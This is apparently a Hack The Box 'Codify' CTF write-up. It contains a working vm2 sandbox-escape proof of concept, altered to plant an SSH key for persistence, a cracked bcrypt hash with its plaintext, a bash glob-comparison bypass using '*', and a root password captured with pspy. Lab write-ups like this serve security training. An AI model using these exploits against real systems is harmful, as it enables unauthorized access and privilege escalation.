---
title: Hack The Box | Codify Writeup 
date: 2024-03-31 23:00:00 +0530
categories: [Blogging, Writeup, Hack The Box]
tags: [Codify, HTB, Writeup, Easy] 
pin: false
math: true
mermaid: true
author: 7h3h0und
image:
  path: /assets/img/headers/codify.png
  lqip: ata:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABhWlDQ1BJQ0MgUHJvZmlsZQAAeJx9kTtIw1AUhv+mlYpWHOwg4pChOlkQH8VRq1CECqFWaNXB5KYvaNKQpLg4Cq4FBx+LVQcXZ10dXAVB8AHi7OCk6CIlntsUWsR44XA//nv/n3PPBYR6mWlWYBzQdNtMJeJiJrsqBl8RQC9VDNMys4w5SUrCc33dw8f3uyjP8r735+pTcxYDfCLxLDNMm3iDOLZpG5z3icOsKKvE58RjJjVI/Mh1xeU3zoUmCzwzbKZT88RhYrHQwUoHs6KpEU8RR1RNp3wh47LKeYuzVq6yVp/8haGcvrLMdaphJLCIJUgQoaCKEsqwEaVdJ8VCis7jHv6hpl8il0KuEhg5FlCBBrnpB/+D37O18pMTblIoDnS9OM7HCBDcBRo1x/k+dpzGCeB/Bq70tr9SB2Y+Sa+1tcgR0L8NXFy3NWUPuNwBBp8M2ZSbkp9KyOeB9zP6piwwcAv0rLlza53j9AFI06ySN8DBITBaoOx1j3d3d87t3zut+f0Arp9yv9nX58IAAAMjSURBVHicnZXNjxtFEMV/1d0zY8delt0kG1ZIkRIRolwiwd+P4MwdJCQQiEAggc1+GK9nerqrisN4DTlhM9Ko1Yeq96re6yo5OX/uHPiJAAL5FrTAfCE0cyF1QEnUmiAIiGDAvS6y7AKmdYpX3eVK/wdcFUqGJy8jHz2NtMtIHZTvv4ari8jsWHAXPEwEJMg22hEEAXx735tACLD8MNHOlqTZMef3j3hw3KC1pVwlTlNh+WLDb48yq03G6i15KJQB3I1NgVaEALgE1AwI+xFwh9QK7awhNPeQxRFHZx/w4H7HbVjSp45TBmY3l/wxDqCJSKGdK2V0fFvxXdUApHY6/rvngEHTCU3TEGZz5idLHj8+5cnDY37XM67pOOeavFB+/QtW2aC2SMpIUNymVOYgMkkQagbfQwLZBsYETRtpupYuRY7axNLnNLctyYTowiJAckNEQSB1Munvk3d8m9CBGCKqdpgJRQQEqlZ6NXqE4iOuhcErqWmoEhAcF4cgU8xdJbvDERFU9vCAs3V+Ba1G1BGrAzdj4bYxZDEQ84AmYfQGDU7wgrlio78HDoILiASqGsS4Rwd8SlCLU0ohjj2yFlYXa94trxndKLnnisTQj+SrNbbZYFYo6rj9g+93JAALEQl7vgIRKNkZc6GJG6JVbl4HXueBPBTykOm6RKnKcHmJ5gETZxwcqxCD4Ntm6J0nUsLtAA+YQr+uxJgxU1arAChmhlWj1kgeK2PJmBulOGPvbCfR1AUR3H0iAJRDCABYjZQMbSNINCQZXYyE0CIBSM68tPi6MuQC1YBJBpe7CTgJMvY95gcQCEFIKaE5MIjQRJjPHGuVFB3NThmdkgNWElEgRKeWgiN42L4i/9fq8UN2gYMgqCnDximjUjKoKoIQUwRxcs7gsv0dM9u2P+Ju7+HDAQQcuFmteHT2kM8/e8nFxTueffKUGCIhGRoGrq9XnJ18zKtXb/jiy69YLha7xWNmBALz+RwRoe97fJ9JuCPgTtM0vH37J998+x2qyk8//0IZC7PZDNJIsZ4Xnz7nxx/e0LbtBBrCLoeIEIIgEnYD6m8qvruCofY7XAAAAABJRU5ErkJggg==
---
## Summary:

### Port Scan:

Lets start with nmap scan to discover some open ports.
``` bash
# Nmap 7.80 scan initiated Tue Jan 30 21:27:02 2024 as: nmap -A -T5 -sV -Pn -oA 10.129.28.48 10.129.28.48
Nmap scan report for 10.129.28.48
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   244.12 ms 10.10.14.1
2   244.47 ms 10.129.28.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 30 21:27:31 2024 -- 1 IP address (1 host up) scanned in 28.56 seconds
```
Nmap scan reavled TCP ports listening on 22(SSH), 80(HTTP) and 3000 (Node.js Express framework)
### Web
As we have http on port 80 enabled, I went ahead and tried browsing with IP address which redirected to codify.htb 
I added the host entry to /etc/hosts file so we can resolve the domain and access the website.

![img-description](/assets/img/htb/codify/1.png) _codify.htb_

Now accessing the web page, we see an application that provide a test environment for Node.js Upon click try me now button we land to a page that has a text editor where we can input node.js code and display its output. 

![img-description](/assets/img/htb/codify/2.png) _editor_


Further enumerating we see `About Us` page provides information on use of vm2 library. This library is used to create sandboxes (isolated environment) allowing us to execute untrusted codes security.
![img-description](/assets/img/htb/codify/3.png) _vm2 library_

## Foothold:

A quick google search for vulnerability associated to vm2 library landed me to a blog post on [bleeping computer](https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/). 

The vulnerability exists in exception sanitization of vm2 for versions up to 3.9.16, allowing attackers to raise an unsensitized host exception inside handleException() which can be used to escape the sandbox and run arbitrary code in host machine. 

This vulnerability can be exploited by using elow PoC.

```bash
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

If we run this JavaScript code on the editor page, we see that it executes successfully and list out the folder directory and ownership.

![img-description](/assets/img/htb/codify/4.png) _ls -la_

As we know that we can read files from /home/svc let us try to put an SSH public key onto ~/.ssh/authorized_keys file.

To do so we will use `echo “SSH key >> ~/.ssh/authorized_keys”`, below modifed exploit code.

```bash
```bash
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('echo "" >> ~/.ssh/autorized_keys');
}
`

console.log(vm.run(code));
```
Once we had the public key in place, I used the private key and was able to login to machine through SSH as SVC user.  

![img-description](/assets/img/htb/codify/5.png) _SSH to SVC_

## Privilege Escalation:

### To User Access:
With few enumerations I came across the web directories and could see an SQLite data base file under `/var/www/contacts` folder. 

```bash
svc@codify:/var/www/contact$ strings tickets.db 
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
	tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
svc@codify:/var/www/contact$ 
```
We could transfer the file to our system using Nmap however I went ahead and tried strings command which reveals hashed password for user Joshua.

I saved the hash into a text file and used hashcat to crack the bcrypt hashed password. 

```bash
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: /home/kasyap/Downloads/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2
Time.Started.....: Wed Apr 10 20:57:23 2024 (7 secs)
Time.Estimated...: Wed Apr 10 20:57:30 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kasyap/Downloads/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:      234 H/s (8.01ms) @ Accel:32 Loops:16 Thr:16 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1536/14344384 (0.01%)
Rejected.........: 0/1536 (0.00%)
Restore.Point....: 1024/14344384 (0.01%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4080-4096
Candidate.Engine.: Device Generator
Candidates.#2....: kucing -> mexico1
Hardware.Mon.#2..: Temp: 36c Fan:  0% Util: 45% Core:2505MHz Mem:  96MHz Bus:16
```
With the password cracked we are now able to login to machine as Joshua and read the user flag.

```bash
kasyap@Brahma:~/Kalki/HTB/codify$ ssh joshua@codify.htb
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 10 03:30:45 PM UTC 2024

  System load:                      0.0
  Usage of /:                       63.6% of 6.50GB
  Memory usage:                     21%
  Swap usage:                       0%
  Processes:                        237
  Users logged in:                  1
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.203.244
  IPv6 address for eth0:            dead:beef::250:56ff:feb0:a5b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar 27 13:01:24 2024 from 10.10.14.23
joshua@codify:~$ 
```

We now OWN the user of the machine!

### From User to Root:

Upon checking the sudo entries for the user Joshua, we can see that we have the ability to execute `/opt/scripts/mysql-backup.sh`

```bash
joshua@codify:~$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
joshua@codify:~$ 
```
While review the script we notice some flaws.

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo
if [[ $DB_PASS == $USER_PASS ]]; then
/usr/bin/echo "Password confirmed!"
else
/usr/bin/echo "Password confirmation failed!"
exit 1
fi
/usr/bin/mkdir -p "$BACKUP_DIR"
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW
DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
for db in $databases; do
/usr/bin/echo "Backing up database: $db"
/usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" |
/usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done
/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```
- First one being the way how it compares the user-provided password and the real password. The use of `==` inside ` [[]] in bash`, is leveraged for pattern matching instead of a direct string comparison. this can be exploited by inputting `*` as password, as` * `matches any string and will be evaluated as true.  

- The second flaw is due to password being taken directly from `/root/.creds`. Allowing us to read the password by using any process snipping tool for instance pspy. 

Let us test and see if it works.

I downloaded the pspy64 binary using python server to vulnerable machine and changed the permission of the file to make it executable.  

![img-description](/assets/img/htb/codify/7.png) _password bypass_
 

I ran the pspy binary and went to another ssh session, and ran the script, providing * as the password, we see the `mysqldump `command being triggered in the pspy output. 

![img-description](/assets/img/htb/codify/8.png) _pspy output with password_

Here we can see the password for the root user in the pspy shell.  
```bash
2024/04/10 15:35:53 CMD: UID=0     PID=2415   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -p kljh12k3jhaskjh12kjh3 -e SHOW DATABASES; 
```
I tried switching to root user with this password and was able to authenticate as root user.  
![img-description](/assets/img/htb/codify/9.png) _password bypass_
We have the machine `ROOTED!`  